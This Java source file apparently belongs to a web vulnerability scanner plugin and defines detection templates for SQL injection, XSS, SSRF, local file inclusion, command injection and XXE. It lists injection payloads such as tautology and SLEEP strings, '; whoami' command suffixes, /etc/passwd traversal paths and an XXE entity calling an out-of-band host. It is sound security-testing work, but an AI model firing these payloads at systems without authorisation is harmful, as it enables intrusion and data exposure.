package com.xprobe.scanner.templates;

import com.xprobe.scanner.config.Configuration;
import com.xprobe.scanner.config.RuleMatchPair;
import com.xprobe.scanner.config.UnifiedHttpConfig;
import com.xprobe.scanner.config.UnifiedResponseConfig;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * 预定义规则模板库
 * 提供常见漏洞类型的规则模板
 */
public class RuleTemplates {
    
    /**
     * 获取所有预定义模板
     */
    public static List<Configuration> getAllTemplates() {
        List<Configuration> templates = new ArrayList<>();
        
        templates.add(createSQLInjectionTemplate());
        templates.add(createXSSTemplate());
        templates.add(createSSRFTemplate());
        templates.add(createLFITemplate());
        templates.add(createCommandInjectionTemplate());
        templates.add(createXXETemplate());
        
        return templates;
    }
    
    /**
     * SQL注入检测模板
     */
    public static Configuration createSQLInjectionTemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("SQL注入综合检测");
        config.setDescription("检测SQL注入漏洞，包括错误消息检测和时间盲注");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.PARAMETER);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        // 配对1: 错误消息检测
        RuleMatchPair pair1 = new RuleMatchPair(1);
        pair1.setLabel("SQL错误消息检测");
        
        // 请求配置
        UnifiedHttpConfig requestConfig1 = new UnifiedHttpConfig();
        
        // Method匹配
        UnifiedHttpConfig.HttpElementConfig methodElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.METHOD);
        methodElem.setId(1);
        methodElem.setUseForMatch(true);
        methodElem.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        methodElem.getNameMatchConfig().setValues(Arrays.asList("GET", "POST"));
        requestConfig1.addElement(methodElem);
        
        // Parameter匹配+注入
        UnifiedHttpConfig.HttpElementConfig paramElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem.setId(2);
        paramElem.setName("id");
        paramElem.setUseForMatch(true);
        paramElem.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem.getNameMatchConfig().setValues(Arrays.asList("id", "user_id", "uid", "pid", "item_id"));
        paramElem.setUseForInjection(true);
        paramElem.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem.setPayloads(Arrays.asList(
            "{{ORIGINAL}}' OR '1'='1--",
            "{{ORIGINAL}}\" OR \"1\"=\"1--",
            "' OR '1'='1--",
            "\" OR \"1\"=\"1--",
            "' OR 1=1--",
            "\" OR 1=1--"
        ));
        requestConfig1.addElement(paramElem);
        
        requestConfig1.setConditionExpression("1 AND 2");
        
        // 响应配置
        UnifiedResponseConfig responseConfig1 = new UnifiedResponseConfig();
        
        // Status Code匹配
        UnifiedResponseConfig.ResponseElementConfig statusElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.STATUS_CODE);
        statusElem.setId(1);
        statusElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.EQUALS);
        statusElem.getMatchConfig().setValues(Arrays.asList("500"));
        responseConfig1.addElement(statusElem);
        
        // Body匹配
        UnifiedResponseConfig.ResponseElementConfig bodyElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_BODY);
        bodyElem.setId(2);
        bodyElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.CONTAINS);
        bodyElem.getMatchConfig().setCaseSensitive(false);
        bodyElem.getMatchConfig().setValues(Arrays.asList(
            "sql",
            "mysql",
            "syntax error",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "Microsoft SQL Server",
            "Unclosed quotation mark"
        ));
        responseConfig1.addElement(bodyElem);
        
        responseConfig1.setConditionExpression("1 OR 2");
        
        pair1.setRequestConfig(requestConfig1);
        pair1.setResponseConfig(responseConfig1);
        pairs.add(pair1);
        
        // 配对2: 时间盲注检测
        RuleMatchPair pair2 = new RuleMatchPair(2);
        pair2.setLabel("SQL时间盲注检测");
        
        UnifiedHttpConfig requestConfig2 = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem2 = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem2.setId(1);
        paramElem2.setName("id");
        paramElem2.setUseForMatch(true);
        paramElem2.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem2.getNameMatchConfig().setValues(Arrays.asList("id", "user_id", "uid", "pid"));
        paramElem2.setUseForInjection(true);
        paramElem2.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem2.setPayloads(Arrays.asList(
            "{{ORIGINAL}} AND SLEEP(5)--",
            "{{ORIGINAL}}' AND SLEEP(5)--",
            "{{ORIGINAL}}\" AND SLEEP(5)--",
            "{{ORIGINAL}}; WAITFOR DELAY '00:00:05'--"
        ));
        requestConfig2.addElement(paramElem2);
        
        UnifiedResponseConfig responseConfig2 = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig timeElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_TIME);
        timeElem.setId(1);
        timeElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.NUMERIC_COMPARISON);
        timeElem.getMatchConfig().setComparisonOperator(UnifiedResponseConfig.ComparisonOperator.GREATER_THAN);
        timeElem.getMatchConfig().setNumericValue(5000);
        responseConfig2.addElement(timeElem);
        
        pair2.setRequestConfig(requestConfig2);
        pair2.setResponseConfig(responseConfig2);
        pairs.add(pair2);
        
        config.setPairs(pairs);
        config.setPairExpression("1 OR 2");
        
        return config;
    }
    
    /**
     * XSS检测模板
     */
    public static Configuration createXSSTemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("XSS跨站脚本检测");
        config.setDescription("检测反射型XSS漏洞");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.PARAMETER);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        RuleMatchPair pair = new RuleMatchPair(1);
        pair.setLabel("反射型XSS检测");
        
        // 请求配置
        UnifiedHttpConfig requestConfig = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem.setId(1);
        paramElem.setName("q");
        paramElem.setUseForMatch(true);
        paramElem.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem.getNameMatchConfig().setValues(Arrays.asList("q", "search", "query", "keyword", "s"));
        paramElem.setUseForInjection(true);
        paramElem.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem.setPayloads(Arrays.asList(
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'\"><script>alert(1)</script>"
        ));
        requestConfig.addElement(paramElem);
        
        // 响应配置
        UnifiedResponseConfig responseConfig = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig bodyElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_BODY);
        bodyElem.setId(1);
        bodyElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.CONTAINS);
        bodyElem.getMatchConfig().setValues(Arrays.asList(
            "<script>alert(1)</script>",
            "alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ));
        responseConfig.addElement(bodyElem);
        
        pair.setRequestConfig(requestConfig);
        pair.setResponseConfig(responseConfig);
        pairs.add(pair);
        
        config.setPairs(pairs);
        
        return config;
    }
    
    /**
     * SSRF检测模板
     */
    public static Configuration createSSRFTemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("SSRF服务端请求伪造检测");
        config.setDescription("通过Burp Collaborator检测SSRF漏洞");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.PARAMETER);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        // 配对1: HTTP外带
        RuleMatchPair pair1 = new RuleMatchPair(1);
        pair1.setLabel("SSRF HTTP外带");
        
        UnifiedHttpConfig requestConfig1 = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem1 = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem1.setId(1);
        paramElem1.setName("url");
        paramElem1.setUseForMatch(true);
        paramElem1.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem1.getNameMatchConfig().setValues(Arrays.asList("url", "redirect", "callback", "target", "link"));
        paramElem1.setUseForInjection(true);
        paramElem1.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem1.setPayloads(Arrays.asList(
            "http://{{COLLABORATOR}}/",
            "https://{{COLLABORATOR}}/"
        ));
        requestConfig1.addElement(paramElem1);
        
        UnifiedResponseConfig responseConfig1 = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig collabElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.COLLABORATOR);
        collabElem.setId(1);
        collabElem.getMatchConfig().setCollaboratorTypes(Arrays.asList(
            UnifiedResponseConfig.CollaboratorType.HTTP,
            UnifiedResponseConfig.CollaboratorType.HTTPS
        ));
        responseConfig1.addElement(collabElem);
        
        pair1.setRequestConfig(requestConfig1);
        pair1.setResponseConfig(responseConfig1);
        pairs.add(pair1);
        
        // 配对2: DNS外带
        RuleMatchPair pair2 = new RuleMatchPair(2);
        pair2.setLabel("SSRF DNS外带");
        
        UnifiedHttpConfig requestConfig2 = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem2 = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem2.setId(1);
        paramElem2.setName("host");
        paramElem2.setUseForMatch(true);
        paramElem2.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem2.getNameMatchConfig().setValues(Arrays.asList("host", "domain", "server"));
        paramElem2.setUseForInjection(true);
        paramElem2.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem2.setPayloads(Arrays.asList(
            "{{COLLABORATOR}}",
            "http://{{COLLABORATOR}}"
        ));
        requestConfig2.addElement(paramElem2);
        
        UnifiedResponseConfig responseConfig2 = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig dnsElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.COLLABORATOR);
        dnsElem.setId(1);
        dnsElem.getMatchConfig().setCollaboratorTypes(Arrays.asList(
            UnifiedResponseConfig.CollaboratorType.DNS
        ));
        responseConfig2.addElement(dnsElem);
        
        pair2.setRequestConfig(requestConfig2);
        pair2.setResponseConfig(responseConfig2);
        pairs.add(pair2);
        
        config.setPairs(pairs);
        config.setPairExpression("1 OR 2");
        
        return config;
    }
    
    /**
     * 本地文件包含检测模板
     */
    public static Configuration createLFITemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("LFI本地文件包含检测");
        config.setDescription("检测本地文件包含漏洞");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.PARAMETER);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        RuleMatchPair pair = new RuleMatchPair(1);
        pair.setLabel("LFI文件读取");
        
        UnifiedHttpConfig requestConfig = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem.setId(1);
        paramElem.setName("file");
        paramElem.setUseForMatch(true);
        paramElem.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem.getNameMatchConfig().setValues(Arrays.asList("file", "path", "page", "template"));
        paramElem.setUseForInjection(true);
        paramElem.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem.setPayloads(Arrays.asList(
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\windows\\win.ini"
        ));
        requestConfig.addElement(paramElem);
        
        UnifiedResponseConfig responseConfig = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig bodyElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_BODY);
        bodyElem.setId(1);
        bodyElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.CONTAINS);
        bodyElem.getMatchConfig().setValues(Arrays.asList(
            "root:",
            "[fonts]",
            "[extensions]",
            "/bin/bash",
            "/bin/sh"
        ));
        responseConfig.addElement(bodyElem);
        
        pair.setRequestConfig(requestConfig);
        pair.setResponseConfig(responseConfig);
        pairs.add(pair);
        
        config.setPairs(pairs);
        
        return config;
    }
    
    /**
     * 命令注入检测模板
     */
    public static Configuration createCommandInjectionTemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("命令注入检测");
        config.setDescription("检测操作系统命令注入漏洞");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.PARAMETER);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        // 配对1: 错误消息检测
        RuleMatchPair pair1 = new RuleMatchPair(1);
        pair1.setLabel("命令注入错误消息");
        
        UnifiedHttpConfig requestConfig1 = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem1 = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem1.setId(1);
        paramElem1.setName("cmd");
        paramElem1.setUseForMatch(true);
        paramElem1.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem1.getNameMatchConfig().setValues(Arrays.asList("cmd", "command", "exec", "ping"));
        paramElem1.setUseForInjection(true);
        paramElem1.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem1.setPayloads(Arrays.asList(
            "{{ORIGINAL}}; whoami",
            "{{ORIGINAL}}| whoami",
            "{{ORIGINAL}}& whoami",
            "{{ORIGINAL}}`whoami`"
        ));
        requestConfig1.addElement(paramElem1);
        
        UnifiedResponseConfig responseConfig1 = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig bodyElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_BODY);
        bodyElem.setId(1);
        bodyElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.CONTAINS);
        bodyElem.getMatchConfig().setValues(Arrays.asList(
            "root",
            "bin",
            "daemon",
            "www-data",
            "apache",
            "nginx"
        ));
        responseConfig1.addElement(bodyElem);
        
        pair1.setRequestConfig(requestConfig1);
        pair1.setResponseConfig(responseConfig1);
        pairs.add(pair1);
        
        // 配对2: 时间延迟检测
        RuleMatchPair pair2 = new RuleMatchPair(2);
        pair2.setLabel("命令注入时间延迟");
        
        UnifiedHttpConfig requestConfig2 = new UnifiedHttpConfig();
        UnifiedHttpConfig.HttpElementConfig paramElem2 = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.PARAMETER);
        paramElem2.setId(1);
        paramElem2.setName("cmd");
        paramElem2.setUseForMatch(true);
        paramElem2.getNameMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.EQUALS);
        paramElem2.getNameMatchConfig().setValues(Arrays.asList("cmd", "command", "exec", "ping"));
        paramElem2.setUseForInjection(true);
        paramElem2.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.VALUE);
        paramElem2.setPayloads(Arrays.asList(
            "{{ORIGINAL}}; sleep 5",
            "{{ORIGINAL}}| sleep 5",
            "{{ORIGINAL}}& timeout 5"
        ));
        requestConfig2.addElement(paramElem2);
        
        UnifiedResponseConfig responseConfig2 = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig timeElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.RESPONSE_TIME);
        timeElem.setId(1);
        timeElem.getMatchConfig().setMatchType(UnifiedResponseConfig.MatchType.NUMERIC_COMPARISON);
        timeElem.getMatchConfig().setComparisonOperator(UnifiedResponseConfig.ComparisonOperator.GREATER_THAN);
        timeElem.getMatchConfig().setNumericValue(5000);
        responseConfig2.addElement(timeElem);
        
        pair2.setRequestConfig(requestConfig2);
        pair2.setResponseConfig(responseConfig2);
        pairs.add(pair2);
        
        config.setPairs(pairs);
        config.setPairExpression("1 OR 2");
        
        return config;
    }
    
    /**
     * XXE检测模板
     */
    public static Configuration createXXETemplate() {
        Configuration config = new Configuration();
        config.setCustomLabel("XXE XML外部实体注入检测");
        config.setDescription("通过Burp Collaborator检测XXE漏洞");
        config.setEnabled(true);
        config.setDeduplicationGranularity(Configuration.DeduplicationGranularity.REQUEST);
        
        List<RuleMatchPair> pairs = new ArrayList<>();
        
        RuleMatchPair pair = new RuleMatchPair(1);
        pair.setLabel("XXE外带检测");
        
        UnifiedHttpConfig requestConfig = new UnifiedHttpConfig();
        
        // Content-Type匹配
        UnifiedHttpConfig.HttpElementConfig headerElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.HEADER);
        headerElem.setId(1);
        headerElem.setName("Content-Type");
        headerElem.setUseForMatch(true);
        headerElem.getValueMatchConfig().setMatchType(UnifiedHttpConfig.MatchType.CONTAINS);
        headerElem.getValueMatchConfig().setValues(Arrays.asList("xml", "application/xml"));
        requestConfig.addElement(headerElem);
        
        // Body注入
        UnifiedHttpConfig.HttpElementConfig bodyElem = new UnifiedHttpConfig.HttpElementConfig(UnifiedHttpConfig.ElementType.BODY);
        bodyElem.setId(2);
        bodyElem.setUseForInjection(true);
        bodyElem.setInjectionTarget(UnifiedHttpConfig.InjectionTarget.ENTIRE);
        bodyElem.setPayloads(Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://{{COLLABORATOR}}/\">]><root>&xxe;</root>"
        ));
        requestConfig.addElement(bodyElem);
        
        requestConfig.setConditionExpression("1 AND 2");
        
        UnifiedResponseConfig responseConfig = new UnifiedResponseConfig();
        UnifiedResponseConfig.ResponseElementConfig collabElem = new UnifiedResponseConfig.ResponseElementConfig(UnifiedResponseConfig.ElementType.COLLABORATOR);
        collabElem.setId(1);
        collabElem.getMatchConfig().setCollaboratorTypes(Arrays.asList(
            UnifiedResponseConfig.CollaboratorType.HTTP,
            UnifiedResponseConfig.CollaboratorType.DNS
        ));
        responseConfig.addElement(collabElem);
        
        pair.setRequestConfig(requestConfig);
        pair.setResponseConfig(responseConfig);
        pairs.add(pair);
        
        config.setPairs(pairs);
        
        return config;
    }
}

